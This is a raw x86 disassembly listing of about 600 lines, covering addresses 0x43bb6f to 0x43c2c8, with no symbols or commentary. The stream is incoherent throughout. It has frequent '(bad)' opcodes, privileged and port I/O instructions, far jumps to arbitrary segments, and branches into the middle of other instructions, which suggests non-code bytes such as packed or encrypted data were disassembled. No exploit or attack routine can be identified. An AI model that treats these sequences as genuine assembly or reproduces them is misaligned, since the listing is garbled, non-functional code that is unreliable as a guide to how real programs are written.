  43bb6f:	mov    dl,BYTE PTR [ecx+0x72]
  43bb72:	in     al,0x63
  43bb74:	add    ecx,ebp
  43bb76:	popa   
  43bb77:	lahf   
  43bb78:	push   eax
  43bb79:	push   cs
  43bb7a:	xlat   BYTE PTR ds:[ebx]
  43bb7b:	ins    BYTE PTR es:[edi],dx
  43bb7c:	mov    esp,0xc1d2ab00
  43bb81:	clts   
  43bb83:	int    0xf7
  43bb85:	dec    DWORD PTR [ebx+0x3b331262]
  43bb8b:	(bad)  
  43bb8c:	jp     0x43bbce
  43bb8e:	repnz mov ebp,0xddbd88fc
  43bb94:	pop    es
  43bb95:	inc    esi
  43bb96:	xchg   DWORD PTR [edx+edi*2+0x74ad5278],edi
  43bb9d:	mov    esi,DWORD PTR [ebp+0x4bfff852]
  43bba3:	pop    edx
  43bba4:	mov    eax,0xf862c70f
  43bba9:	(bad)  
  43bbaa:	cmp    ebx,DWORD PTR [edx+edi*4-0x38]
  43bbae:	cmp    ebx,ebx
  43bbb0:	add    BYTE PTR [eax],al
  43bbb2:	jbe    0x43bb3a
  43bbb4:	jne    0x43bbae
  43bbb6:	call   edi
  43bbb8:	jl     0x43bb9b
  43bbba:	sti    
  43bbbb:	fiadd  DWORD PTR [eax]
  43bbbd:	mov    esi,DWORD PTR ds:0x1b4e7ced
  43bbc3:	xor    esi,0xd955008c
  43bbc9:	inc    esi
  43bbca:	mov    DWORD PTR [esi+0x9],eax
  43bbcd:	jg     0x43bc1c
  43bbcf:	jmp    0x43bbd3
  43bbd1:	jbe    0x43bbfe
  43bbd3:	retf   
  43bbd4:	fidivr DWORD PTR [edi+0x45]
  43bbd7:	ret    
  43bbd8:	pop    ecx
  43bbd9:	mov    eax,0x7a5bae78
  43bbde:	sbb    al,0xbb
  43bbe0:	sahf   
  43bbe1:	add    edi,eax
  43bbe3:	push   es
  43bbe4:	jecxz  0x43bbe1
  43bbe6:	jmp    FWORD PTR [edi+eax*1+0x7d]
  43bbea:	pop    esi
  43bbeb:	xchg   ebx,eax
  43bbec:	retf   
  43bbed:	ror    BYTE PTR [ebx-0xb843c80],0x10
  43bbf4:	and    cl,BYTE PTR ds:0x4e0162c1
  43bbfa:	push   0x87544ed9
  43bbff:	pop    ds
  43bc00:	lock repz inc ecx
  43bc03:	push   cs
  43bc04:	imul   eax,DWORD PTR [eax+0x10],0xd
  43bc08:	push   eax
  43bc09:	sub    eax,0x443abe8
  43bc0e:	add    BYTE PTR [ebx],bh
  43bc10:	ss jge 0x43bc12
  43bc13:	pop    ebp
  43bc14:	add    BYTE PTR [ecx+0x36795252],cl
  43bc1a:	jo     0x43bc87
  43bc1c:	data16 cmp bh,0x45
  43bc20:	add    BYTE PTR [ecx],ch
  43bc22:	pop    ebx
  43bc23:	imul   esi,DWORD PTR ss:[edi],0x8
  43bc27:	arpl   bp,ax
  43bc29:	fdivr  DWORD PTR [eax+eax*1+0x2a]
  43bc2d:	add    DWORD PTR [eax+0x75],ecx
  43bc30:	fistp  QWORD PTR [edi]
  43bc32:	dec    eax
  43bc33:	jbe    0x43bc3e
  43bc35:	retf   
  43bc36:	mov    DWORD PTR [ecx+0x6a],eax
  43bc39:	jge    0x43bbf7
  43bc3b:	jb     0x43bc97
  43bc3d:	jnp    0x43bc7d
  43bc3f:	js     0x43bc9a
  43bc41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bc42:	pop    eax
  43bc43:	je     0x43bbc9
  43bc45:	imul   ecx,DWORD PTR [esi+0x14],0x39
  43bc49:	push   0x67d8fe52
  43bc4e:	adc    eax,eax
  43bc50:	fbstp  TBYTE PTR [esi+0x50]
  43bc53:	adc    cl,cl
  43bc55:	add    bh,BYTE PTR [edi+0x46]
  43bc58:	bound  edi,QWORD PTR [ebx+0x26]
  43bc5b:	add    al,0xd8
  43bc5d:	jecxz  0x43bc52
  43bc5f:	test   BYTE PTR [eax+edx*1],dl
  43bc62:	mov    WORD PTR [ebx],ss
  43bc64:	push   0x40
  43bc66:	sbb    ecx,eax
  43bc68:	xor    BYTE PTR [edi+0x7b524189],dl
  43bc6e:	ds jo  0x43bc7e
  43bc71:	(bad)  
  43bc73:	mov    eax,0x33916b9c
  43bc78:	and    eax,0x7a67afc8
  43bc7d:	lahf   
  43bc7e:	stos   BYTE PTR es:[edi],al
  43bc7f:	add    esp,DWORD PTR [edx-0x40]
  43bc82:	aas    
  43bc83:	test   BYTE PTR [ebp-0x13],bh
  43bc86:	jmp    0xd0ace015
  43bc8b:	jne    0x43bc6e
  43bc8d:	fsubr  st,st(1)
  43bc8f:	add    eax,DWORD PTR [eax]
  43bc91:	cmp    eax,0xd82af16f
  43bc96:	vandnps xmm6,xmm2,XMMWORD PTR [edx-0x26]
  43bc9b:	dec    edi
  43bc9c:	add    BYTE PTR [ebp+0x6f],cl
  43bc9f:	icebp  
  43bca0:	add    cl,cl
  43bca2:	in     eax,dx
  43bca3:	push   0x55
  43bca5:	push   esi
  43bca6:	(bad)  
  43bca8:	jl     0x43bc4f
  43bcaa:	jmp    0x43bc5a
  43bcac:	aam    0xe6
  43bcae:	xchg   esi,eax
  43bcaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bcb0:	xor    al,0x8f
  43bcb2:	mov    esi,DWORD PTR [edx-0x22]
  43bcb5:	mov    eax,0xbb03e617
  43bcba:	nop
  43bcbb:	fcmovb st,st(3)
  43bcbd:	stos   DWORD PTR es:[edi],eax
  43bcbe:	pusha  
  43bcbf:	jge    0x43bcf7
  43bcc1:	(bad)  
  43bcc2:	fucomp st(1)
  43bcc4:	xor    al,0x97
  43bcc6:	pop    eax
  43bcc7:	mov    dl,0xd4
  43bcc9:	fwait
  43bcca:	pusha  
  43bccb:	test   DWORD PTR [esi],esi
  43bccd:	lods   al,BYTE PTR ds:[esi]
  43bcce:	fucomp st(1)
  43bcd0:	(bad)  
  43bcd1:	sbb    DWORD PTR [esi],ebx
  43bcd3:	cs (bad) 
  43bcd5:	test   eax,0xa9c7261d
  43bcda:	sbb    eax,0x88b988b5
  43bcdf:	scas   al,BYTE PTR es:[edi]
  43bce0:	mov    BYTE PTR [eax-0x1f],cl
  43bce3:	cli    
  43bce4:	mov    eax,0xaacece0
  43bce9:	sbb    ebx,DWORD PTR [esi+0x1]
  43bcec:	stos   BYTE PTR es:[edi],al
  43bced:	sub    eax,DWORD PTR [ebp-0x135ad4ab]
  43bcf3:	dec    ebp
  43bcf4:	jb     0x43bcf6
  43bcf6:	out    dx,al
  43bcf7:	or     al,0x1
  43bcf9:	jmp    0x9d33155f
  43bcfe:	pop    ebx
  43bcff:	pusha  
  43bd00:	aas    
  43bd01:	jae    0x43bd52
  43bd03:	xchg   edx,eax
  43bd04:	pop    ebx
  43bd05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bd06:	mov    ds:0xf77200d8,eax
  43bd0b:	imul   eax,DWORD PTR [eax],0xffffffe9
  43bd0e:	popa   
  43bd0f:	(bad)  
  43bd10:	jle    0x43bd77
  43bd12:	popa   
  43bd13:	fld    DWORD PTR [eax]
  43bd15:	pop    esp
  43bd16:	push   ebp
  43bd17:	mov    ds:0xd95eb196,eax
  43bd1c:	add    BYTE PTR [ebp+ecx*2+0x55],bl
  43bd20:	inc    edi
  43bd21:	pop    ecx
  43bd22:	push   ebp
  43bd23:	lahf   
  43bd24:	ins    BYTE PTR es:[edi],dx
  43bd25:	cmp    eax,0x56596065
  43bd2a:	mov    ch,0xca
  43bd2c:	push   edx
  43bd2d:	inc    ebx
  43bd2e:	repnz or ax,0xc205
  43bd33:	xchg   ebp,eax
  43bd34:	add    BYTE PTR [edx+0x2a],ch
  43bd37:	aam    0x83
  43bd39:	pop    ds
  43bd3a:	push   esi
  43bd3b:	loope  0x43bcfc
  43bd3d:	out    dx,eax
  43bd3e:	popa   
  43bd3f:	fld    DWORD PTR [eax]
  43bd41:	jmp    0x2fc991f0
  43bd46:	push   0xffffff89
  43bd48:	call   0x11d0db6
  43bd4d:	pop    ds
  43bd4e:	mov    ecx,ds
  43bd50:	mov    edi,0xd92627
  43bd55:	jmp    0x551afbb
  43bd5a:	add    BYTE PTR [edx-0x6b],al
  43bd5d:	add    BYTE PTR [edx-0x66],ch
  43bd60:	rcl    DWORD PTR [esi+0x26],cl
  43bd63:	(bad)  [ebx]
  43bd65:	add    DWORD PTR [eax],eax
  43bd67:	retf   
  43bd68:	xlat   BYTE PTR ds:[ebx]
  43bd69:	add    BYTE PTR [eax],al
  43bd6b:	retf   
  43bd6c:	xlat   BYTE PTR ds:[ebx]
  43bd6d:	pop    ecx
  43bd6e:	mov    edi,DWORD PTR [eax-0x44]
  43bd71:	pop    ebx
  43bd72:	ret    0xd7bf
  43bd75:	(bad)  
  43bd76:	int3   
  43bd77:	push   edi
  43bd78:	sbb    esp,ecx
  43bd7a:	int3   
  43bd7b:	inc    edi
  43bd7c:	sbb    esp,ecx
  43bd7e:	int3   
  43bd7f:	into   
  43bd80:	push   0xffffffeb
  43bd82:	add    DWORD PTR [edi-0x74000915],0xf05752a2
  43bd8c:	add    ch,BYTE PTR [edi+0xd77b0b]
  43bd92:	lea    esi,[esi]
  43bd94:	adc    edx,edi
  43bd96:	inc    DWORD PTR [esp+eax*1-0x5d]
  43bd9a:	mov    eax,DWORD PTR [esi-0x75faa213]
  43bda0:	pop    eax
  43bda1:	xchg   ebx,eax
  43bda2:	hlt    
  43bda3:	adc    eax,0x3852f908
  43bda8:	cmp    al,0x7f
  43bdaa:	test   DWORD PTR [ebx+0x6],ebp
  43bdad:	stc    
  43bdae:	jmp    DWORD PTR [ebx]
  43bdb0:	pushf  
  43bdb1:	cmp    al,BYTE PTR [eax]
  43bdb3:	cmp    eax,esp
  43bdb5:	stc    
  43bdb6:	or     edi,0xffffffea
  43bdb9:	jle    0x43bd40
  43bdbb:	pop    ds
  43bdbc:	or     cl,bh
  43bdbe:	inc    DWORD PTR [eax]
  43bdc0:	xor    BYTE PTR [eax],ah
  43bdc2:	or     DWORD PTR [ebp+eiz*4+0x5b0000d3],eax
  43bdc9:	pop    eax
  43bdca:	xor    esp,0x75
  43bdcd:	pop    es
  43bdce:	stc    
  43bdcf:	push   eax
  43bdd0:	jecxz  0x43bdad
  43bdd2:	out    0xff,eax
  43bdd4:	je     0x43be41
  43bdd6:	in     eax,0x8b
  43bdd8:	xchg   ebx,eax
  43bdd9:	push   ebx
  43bdda:	les    ecx,FWORD PTR [eax]
  43bddc:	rcr    BYTE PTR [eax],1
  43bdde:	jg     0x43be25
  43bde0:	bound  ebx,QWORD PTR [edx+eax*1+0x401ec84]
  43bde7:	add    cl,ch
  43bde9:	lea    ebx,[edi]
  43bdeb:	stc    
  43bdec:	mov    ch,0xab
  43bdee:	cmp    dl,BYTE PTR [edx+0x12]
  43bdf1:	dec    esi
  43bdf2:	add    DWORD PTR [edx-0x72d4552],0xdc48bb32
  43bdfc:	arpl   WORD PTR [eax],ax
  43bdfe:	add    al,0x0
  43be00:	jp     0x43be56
  43be02:	adc    al,BYTE PTR [eax]
  43be04:	bound  edi,QWORD PTR [edi-0x41]
  43be07:	adc    esp,edi
  43be09:	ror    BYTE PTR [edi-0x3],0xe0
  43be0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43be0e:	rol    BYTE PTR [edi+eiz*8+0x65f8d31c],cl
  43be15:	lea    eax,[eax-0x4]
  43be18:	mov    bl,0x65
  43be1a:	ja     0x43be0f
  43be1c:	push   esp
  43be1d:	or     edx,edx
  43be1f:	out    0xcf,eax
  43be21:	adc    eax,0xe100f8d2
  43be26:	xor    ecx,DWORD PTR [ecx]
  43be28:	and    DWORD PTR [edx],0xffffffac
  43be2b:	std    
  43be2c:	jl     0x43be57
  43be2e:	sub    esi,DWORD PTR [esi-0x7e]
  43be31:	xchg   BYTE PTR [ebx],ah
  43be33:	sar    al,cl
  43be35:	xlat   BYTE PTR ds:[ebx]
  43be36:	(bad)  
  43be37:	loopne 0x43be86
  43be39:	out    dx,eax
  43be3a:	fs fdivr st,st(1)
  43be3d:	adc    eax,0xffe9d54b
  43be42:	inc    edx
  43be43:	sar    BYTE PTR [esi+ebx*1-0xc],cl
  43be47:	jle    0x43be08
  43be49:	jbe    0x43be4a
  43be4b:	jl     0x43be11
  43be4d:	cmc    
  43be4e:	jl     0x43be8f
  43be50:	lock xchg edx,eax
  43be52:	ja     0x43bed3
  43be54:	and    esp,ebp
  43be56:	jp     0x43be29
  43be58:	mov    ch,bh
  43be5a:	fcom   DWORD PTR [ebp-0x2e]
  43be5d:	fucompp 
  43be5f:	push   ecx
  43be60:	mov    cl,0xb9
  43be62:	jmp    0xd4e543b5
  43be67:	pop    esp
  43be68:	les    esi,FWORD PTR [ecx]
  43be6a:	(bad)  
  43be6b:	push   0xffffffbd
  43be6d:	mov    edx,0xab285d5d
  43be72:	jmp    0xe95c3da5
  43be77:	cwde   
  43be78:	jle    0x43be62
  43be7a:	in     al,0x1f
  43be7c:	rcr    DWORD PTR [edx-0x751fd600],1
  43be82:	jmp    0x54a586f1
  43be87:	sub    bl,BYTE PTR [eax+0x0]
  43be8a:	jg     0x43bee2
  43be8c:	xor    edx,ecx
  43be8e:	ficom  WORD PTR [ebx-0x42]
  43be91:	shr    BYTE PTR [edx-0x17],1
  43be94:	pop    esp
  43be95:	aaa    
  43be96:	jb     0x43be1e
  43be98:	push   esp
  43be99:	jg     0x43beec
  43be9b:	call   0xdb818f7e
  43bea0:	(bad)  
  43bea1:	ror    BYTE PTR [edx+0x5d],1
  43bea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bea5:	pop    es
  43bea6:	loope  0x43bec1
  43bea8:	dec    esi
  43bea9:	add    eax,0x7ebf14bf
  43beae:	mov    al,ds:0xe07d19ed
  43beb3:	mov    ebp,0x572ad0ae
  43beb8:	push   ebp
  43beb9:	xlat   BYTE PTR ds:[ebx]
  43beba:	sbb    ebp,ecx
  43bebc:	sahf   
  43bebd:	(bad)  [edi]
  43bebf:	not    BYTE PTR [esi-0x19e27130]
  43bec5:	xchg   ch,al
  43bec7:	ins    DWORD PTR es:[edi],dx
  43bec8:	jmp    0x4186:0x72e92684
  43becf:	call   0x571c8f4a
  43bed4:	add    ebp,eax
  43bed6:	adc    ah,dl
  43bed8:	neg    DWORD PTR [eax]
  43beda:	pop    ebp
  43bedb:	push   ebx
  43bedc:	in     eax,dx
  43bedd:	addr16 mov dl,0xe1
  43bee0:	call   0xf8256b9e
  43bee5:	push   0xffffff9d
  43bee7:	fdivr  QWORD PTR [ebp+0x29]
  43beea:	adc    eax,0x3282e6
  43beef:	xchg   edx,eax
  43bef0:	pop    ebp
  43bef1:	jle    0x43bef8
  43bef3:	xchg   ebx,eax
  43bef4:	loope  0x43beed
  43bef6:	fs ins BYTE PTR es:[edi],dx
  43bef8:	loope  0x43bf4c
  43befa:	pop    esp
  43befb:	sbb    al,0xec
  43befd:	mul    BYTE PTR [esi]
  43beff:	mov    dl,0x0
  43bf01:	xor    cl,BYTE PTR [edx+esi*4]
  43bf04:	loope  0x43be89
  43bf06:	sub    eax,0x95c15c5d
  43bf0b:	data16 retfw 
  43bf0e:	push   es
  43bf0f:	neg    BYTE PTR [edx-0x4b1b3d08]
  43bf15:	div    esi
  43bf17:	xchg   ebp,eax
  43bf18:	imul   ecx,DWORD PTR ds:0x3be59c62,0x74
  43bf1f:	outs   dx,BYTE PTR ds:[esi]
  43bf20:	loop   0x43bf19
  43bf22:	fisubr WORD PTR [ebx+0x2a5439df]
  43bf28:	imul   edi,ebp,0xf
  43bf2b:	xchg   ebx,eax
  43bf2c:	jmp    0x4f2cab9d
  43bf31:	clc    
  43bf32:	mov    esi,0xd7e5d1d
  43bf37:	adc    eax,0x9b5cf7e1
  43bf3c:	jl     0x43bf35
  43bf3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bf3f:	and    eax,0x2a6c8596
  43bf44:	loop   0x43bf3d
  43bf46:	xchg   esi,eax
  43bf47:	es (bad) 
  43bf49:	in     al,0x8e
  43bf4b:	sub    eax,0x700bc65
  43bf50:	push   ecx
  43bf51:	mov    eax,0x5af80074
  43bf56:	mov    ebp,0x6c527eff
  43bf5b:	dec    DWORD PTR [eax+ebx*1+0x48]
  43bf5f:	mov    eax,DWORD PTR [esi-0x4f]
  43bf62:	stc    
  43bf63:	jmp    FWORD PTR [edx+ebx*2]
  43bf66:	mov    esi,esp
  43bf68:	sub    eax,0x83e8f918
  43bf6d:	stc    
  43bf6e:	clc    
  43bf6f:	dec    DWORD PTR [eax+0x11]
  43bf72:	add    al,0x85
  43bf74:	jnp    0x43bef7
  43bf76:	cmc    
  43bf77:	add    BYTE PTR [eax-0x684280e8],0x16
  43bf7e:	stc    
  43bf7f:	push   DWORD PTR [edx+0x6c]
  43bf82:	idiv   bh
  43bf84:	jnp    0x43bfe8
  43bf86:	mov    ah,BYTE PTR [esp+ebp*2]
  43bf89:	sbb    cl,bh
  43bf8b:	push   ecx
  43bf8c:	push   ds
  43bf8d:	(bad)  {k4}
  43bf92:	inc    esi
  43bf93:	call   0x3cb9f3
  43bf98:	add    BYTE PTR [ebx],cl
  43bf9a:	jge    0x43bf64
  43bf9c:	enter  0x11,0xb
  43bfa0:	or     eax,0xb6e44266
  43bfa5:	fidiv  DWORD PTR [ebp-0x35]
  43bfa8:	sub    al,0x64
  43bfaa:	xchg   edx,eax
  43bfab:	and    al,0x2c
  43bfad:	sbb    cl,bh
  43bfaf:	push   edi
  43bfb0:	push   ebp
  43bfb1:	lods   eax,DWORD PTR ds:[esi]
  43bfb2:	inc    esi
  43bfb3:	(bad)  
  43bfb4:	(bad)  
  43bfb5:	push   cs
  43bfb6:	cli    
  43bfb7:	inc    DWORD PTR [eax]
  43bfb9:	in     al,dx
  43bfba:	stos   BYTE PTR es:[edi],al
  43bfbb:	jg     0x43c03a
  43bfbd:	out    dx,eax
  43bfbe:	add    dh,BYTE PTR [edx+0x75db0b3c]
  43bfc4:	les    edx,FWORD PTR [edi]
  43bfc6:	push   edx
  43bfc7:	mov    eax,0x82f36274
  43bfcc:	(bad)  
  43bfcd:	std    
  43bfce:	jnp    0x43bf58
  43bfd0:	and    esi,ebp
  43bfd2:	pop    edi
  43bfd3:	(bad)  
  43bfd4:	mov    bl,BYTE PTR [edi-0x2874d39c]
  43bfda:	fs (bad) 
  43bfde:	pop    eax
  43bfdf:	mov    edi,0x827fd5e4
  43bfe4:	ret    
  43bfe5:	data16 jge 0x43bfab
  43bfe8:	jae    0x43c04b
  43bfea:	jae    0x43bfa6
  43bfec:	clc    
  43bfed:	jmp    0xb63cdf6f
  43bff2:	lahf   
  43bff3:	adc    BYTE PTR [edx-0x4e],0x42
  43bff7:	or     DWORD PTR [edx-0x7395152],0xf8db388a
  43c001:	xchg   ebp,eax
  43c002:	jae    0x43bfc3
  43c004:	add    esp,edi
  43c006:	mov    al,0x4f
  43c008:	std    
  43c009:	loopne 0x43bfc6
  43c00b:	(bad)  
  43c00c:	mov    ah,BYTE PTR [edi]
  43c00e:	int3   
  43c00f:	xor    eax,DWORD PTR [ebp-0x738eb21]
  43c015:	ins    DWORD PTR es:[edi],dx
  43c016:	jne    0x43bf98
  43c018:	repz fs out dx,eax
  43c01b:	(bad)
  43c01e:	mov    ebx,ebx
  43c020:	xabort 0xe1
  43c023:	xor    ecx,DWORD PTR [ecx]
  43c025:	and    DWORD PTR [edx],0xffffff8c
  43c028:	add    DWORD PTR [ebp+0x19],edi
  43c02b:	(bad)  
  43c02d:	add    BYTE PTR [esi-0x180739e9],0xac
  43c034:	ror    BYTE PTR [esi-0x21],1
  43c037:	je     0x43c011
  43c039:	stc    
  43c03a:	and    eax,0x905d52f
  43c03f:	aaa    
  43c040:	(bad)  
  43c041:	jl     0x43c061
  43c043:	fxam   
  43c045:	xchg   ch,cl
  43c047:	ins    BYTE PTR es:[edi],dx
  43c048:	jmp    0xfe37:0x62e61e80
  43c04f:	push   ebx
  43c050:	sbb    eax,0x6552a5d0
  43c055:	sub    bl,ch
  43c057:	in     eax,0x76
  43c059:	jg     0x43c033
  43c05b:	in     al,dx
  43c05c:	outs   dx,DWORD PTR ds:[esi]
  43c05d:	int    0xda
  43c05f:	dec    edi
  43c060:	dec    ebp
  43c061:	and    bl,bl
  43c063:	in     eax,0x5e
  43c065:	jnp    0x43c06f
  43c067:	test   eax,0xf0cacd56
  43c06c:	sub    eax,0x6ae5bada
  43c071:	enter  0x5c61,0x2a
  43c075:	pop    eax
  43c076:	scas   eax,DWORD PTR es:[edi]
  43c077:	pop    edx
  43c078:	xor    ecx,ebp
  43c07a:	ficomp WORD PTR [ebx-0x5e5aeed3]
  43c080:	pop    esp
  43c081:	and    BYTE PTR [eax],al
  43c083:	fwait
  43c084:	in     eax,0x1e
  43c086:	push   edi
  43c087:	pop    esp
  43c088:	mov    ds:0xe58b1464,al
  43c08d:	push   cs
  43c08e:	push   edi
  43c08f:	mov    al,fs:0xdbf0d784
  43c095:	ror    BYTE PTR [esi+0x72],0x6c
  43c099:	fmul   QWORD PTR [eax-0x33111a34]
  43c09f:	out    0x5e,al
  43c0a1:	mov    esi,0x6ce55acc
  43c0a6:	ds dec esi
  43c0a8:	mov    esp,DWORD PTR [esi+edi*2+0x51]
  43c0ac:	in     al,0xce
  43c0ae:	int3   
  43c0af:	inc    ebp
  43c0b0:	jecxz  0x43c075
  43c0b2:	int3   
  43c0b3:	cmp    bl,BYTE PTR [ecx-0x5a]
  43c0b6:	pop    es
  43c0b7:	loope  0x43c0d2
  43c0b9:	add    DWORD PTR cs:[edi-0x6549fef0],esp
  43c0c0:	xchg   esp,esi
  43c0c2:	pop    esp
  43c0c3:	pushf  
  43c0c4:	in     eax,0x50
  43c0c6:	jb     0x43c0ac
  43c0c8:	mov    eax,0x50169ef7
  43c0cd:	xchg   BYTE PTR [ebp+0x60f7e22f],bl
  43c0d3:	ins    BYTE PTR es:[edi],dx
  43c0d4:	js     0x43c0cd
  43c0d6:	xchg   BYTE PTR [esi],bl
  43c0d8:	pop    esp
  43c0d9:	mov    dh,0x11
  43c0db:	pop    ss
  43c0dc:	loop   0x43c0d5
  43c0de:	sbb    DWORD PTR [edx],0xe26ef7ff
  43c0e4:	sbb    ch,bh
  43c0e6:	imul   eax,DWORD PTR [eax],0xffffffa1
  43c0e9:	push   0xe20a6a03
  43c0ee:	mov    esp,DWORD PTR [ebp+ebp*4-0x58fa81a3]
  43c0f5:	loope  0x43c0ee
  43c0f7:	je     0x43c12d
  43c0f9:	test   al,0xf7
  43c0fb:	ds xchg esi,eax
  43c0fd:	pop    ebx
  43c0fe:	xchg   ch,al
  43c100:	scas   al,BYTE PTR es:[edi]
  43c101:	loope  0x43c0fa
  43c103:	fwait
  43c104:	adc    al,0x4f
  43c106:	in     eax,dx
  43c107:	daa    
  43c108:	sahf   
  43c109:	loope  0x43c094
  43c10b:	pop    esp
  43c10c:	xor    edx,esp
  43c10e:	not    DWORD PTR [esi]
  43c110:	cdq    
  43c111:	scas   al,BYTE PTR es:[edi]
  43c112:	jmp    0xe4ed:0xbc65a60e
  43c119:	and    al,0x6d
  43c11b:	jmp    0x70d4:0x62f81de2
  43c122:	imul   esi
  43c124:	sub    DWORD PTR [ebp-0x4a],ebx
  43c127:	dec    ebp
  43c128:	sbb    ecx,esp
  43c12a:	div    DWORD PTR [edx-0x1d]
  43c12d:	jae    0x43c126
  43c12f:	(bad)  
  43c130:	sub    DWORD PTR [ebp-0x35],ebx
  43c133:	jmp    0x1093:0x7dd4f8
  43c13a:	stc    
  43c13b:	jmp    DWORD PTR [eax+0xd]
  43c13e:	jo     0x9ddd
  43c143:	ja     0x43c144
  43c145:	shl    BYTE PTR [edi-0x4035028e],cl
  43c14b:	cmp    eax,DWORD PTR [eax]
  43c14d:	and    cl,BYTE PTR [ecx-0x467174e0]
  43c153:	stc    
  43c154:	jmp    esp
  43c156:	arpl   WORD PTR [edx-0x6f01bf0],cx
  43c15c:	push   eax
  43c15d:	dec    edx
  43c15e:	adc    BYTE PTR [ebx-0x6efabf8],dl
  43c164:	cmp    edi,0xffffffe4
  43c167:	pop    eax
  43c168:	pop    esi
  43c169:	push   0x1e8b4d1d
  43c16e:	mov    dl,0xb5
  43c170:	mov    esi,DWORD PTR [ebx-0x3c]
  43c173:	into   
  43c174:	mov    ebp,DWORD PTR [ebp-0xc]
  43c177:	xchg   edx,eax
  43c178:	jo     0x43c19e
  43c17a:	adc    cl,bh
  43c17c:	sub    eax,DWORD PTR [esp+esi*8-0x6e]
  43c180:	push   0x68f91054
  43c185:	pop    ebx
  43c186:	fld    QWORD PTR [eax]
  43c188:	add    cl,dh
  43c18a:	fadd   QWORD PTR [edi-0x77]
  43c18d:	push   es
  43c18e:	sar    ecx,1
  43c190:	call   DWORD PTR [esi+eiz*2-0x6e]
  43c194:	inc    eax
  43c195:	fs adc cl,bh
  43c198:	mov    esi,edi
  43c19a:	mov    al,0xf9
  43c19c:	jmp    DWORD PTR [esp+eiz*2-0x4e]
  43c1a0:	pusha  
  43c1a1:	push   esp
  43c1a2:	adc    cl,bh
  43c1a4:	mov    esi,esi
  43c1a6:	xor    bh,BYTE PTR [edi+0x4d]
  43c1a9:	and    edx,DWORD PTR [eax]
  43c1ab:	adc    esp,DWORD PTR [eax]
  43c1ad:	xchg   edi,eax
  43c1ae:	cdq    
  43c1af:	add    BYTE PTR [ebx+0x7f286200],cl
  43c1b5:	ret    
  43c1b6:	data16 jge 0x43c15f
  43c1b9:	jae    0x43c212
  43c1bb:	pop    ecx
  43c1bc:	add    BYTE PTR [eax],al
  43c1be:	(bad)  
  43c1bf:	lock js 0x43c174
  43c1c2:	push   ss
  43c1c3:	sub    ecx,ebx
  43c1c5:	clc    
  43c1c6:	jmp    0xc830f0f2
  43c1cb:	dec    eax
  43c1cc:	psllq  mm0,QWORD PTR ds:0xe95a2b44
  43c1d3:	das    
  43c1d4:	daa    
  43c1d5:	test   edi,edi
  43c1d7:	mov    ch,0xbf
  43c1d9:	retf   
  43c1da:	push   ds
  43c1db:	sub    eax,0x3516cbb0
  43c1e0:	mov    al,0xcb
  43c1e2:	scas   al,BYTE PTR es:[edi]
  43c1e3:	lds    esi,FWORD PTR [edi-0x15]
  43c1e6:	loope  0x43c24c
  43c1e8:	rsqrtps xmm3,xmm1
  43c1eb:	add    eax,0xb7a22cf0
  43c1f0:	int3   
  43c1f1:	jae    0x43c182
  43c1f3:	and    eax,DWORD PTR [ebp+0x3f06207]
  43c1f9:	mov    ebp,DWORD PTR [edi]
  43c1fb:	(bad)  
  43c1fc:	into   
  43c1fd:	mov    ds:0x86cc3ddb,al
  43c202:	daa    
  43c203:	lods   al,BYTE PTR ds:[esi]
  43c204:	jbe    0x43c248
  43c206:	push   0x40
  43c208:	mov    esi,?
  43c20a:	(bad)  
  43c20b:	lock add ecx,DWORD PTR [ebx+0x79dbac2f]
  43c212:	jns    0x43c1df
  43c214:	retf   0x7c
  43c217:	sahf   
  43c218:	cld    
  43c219:	sub    bl,BYTE PTR [edx-0x27]
  43c21c:	aad    0x28
  43c21e:	mov    esi,0x4a76f05a
  43c223:	push   0x41
  43c225:	mov    esi,?
  43c227:	push   ebp
  43c228:	lock add ebp,DWORD PTR ds:0x65d1d930
  43c22f:	dec    edi
  43c230:	loop   0x43c208
  43c232:	test   DWORD PTR [ecx],esp
  43c234:	(bad)  [edi]
  43c236:	jge    0x43c278
  43c238:	test   BYTE PTR [ebx-0x51f1d204],ch
  43c23e:	mov    eax,0xb8a61519
  43c243:	sub    DWORD PTR ds:0x8b097d15,edx
  43c249:	bound  ecx,QWORD PTR [edi+0x5a]
  43c24c:	pop    esp
  43c24d:	cwde   
  43c24e:	dec    edi
  43c24f:	pop    edx
  43c250:	push   esp
  43c251:	and    BYTE PTR [esi-0x65],ch
  43c254:	test   BYTE PTR [ebx+0x48566200],ch
  43c25a:	in     al,0xed
  43c25c:	loope  0x43c247
  43c25e:	add    ebp,DWORD PTR [esi-0x25]
  43c261:	paddusb mm5,mm3
  43c264:	fisubr WORD PTR [esi-0x37]
  43c267:	ficomp WORD PTR [edx-0x3ae48347]
  43c26d:	jb     0x43c2a1
  43c26f:	outs   dx,BYTE PTR ds:[esi]
  43c270:	mov    DWORD PTR [eax-0x3c755038],edi
  43c276:	add    edi,DWORD PTR [ebx+0x57fdcb]
  43c27c:	fldcw  WORD PTR es:[edx-0x40]
  43c280:	push   ebp
  43c281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c282:	sub    DWORD PTR [edx],ebp
  43c284:	cmp    DWORD PTR [edi],edx
  43c286:	out    0x3,al
  43c288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c289:	adc    al,0x16
  43c28b:	mov    eax,0xb82e1499
  43c290:	cdq    
  43c291:	adc    al,0x26
  43c293:	mov    eax,0x7cb514a9
  43c298:	mov    DWORD PTR [ebp-0xa],edx
  43c29b:	not    DWORD PTR [edx]
  43c29d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c29e:	dec    BYTE PTR [edx]
  43c2a0:	jmp    0xe9413065
  43c2a5:	cwde   
  43c2a6:	add    BYTE PTR [ebx-0x75],dl
  43c2a9:	push   esi
  43c2aa:	fimul  WORD PTR [edi+eiz*1-0x38c0ff33]
  43c2b1:	imul   ecx,DWORD PTR [eax],0x22
  43c2b4:	adc    ebp,DWORD PTR [ebp+0x8]
  43c2b7:	bound  esp,QWORD PTR [ebx-0x3dd8f487]
  43c2bd:	ins    BYTE PTR es:[edi],dx
  43c2be:	add    eax,0xf846d627
  43c2c3:	mov    esi,0xcc8b822a
  43c2c8:	cmp    al,0x1f
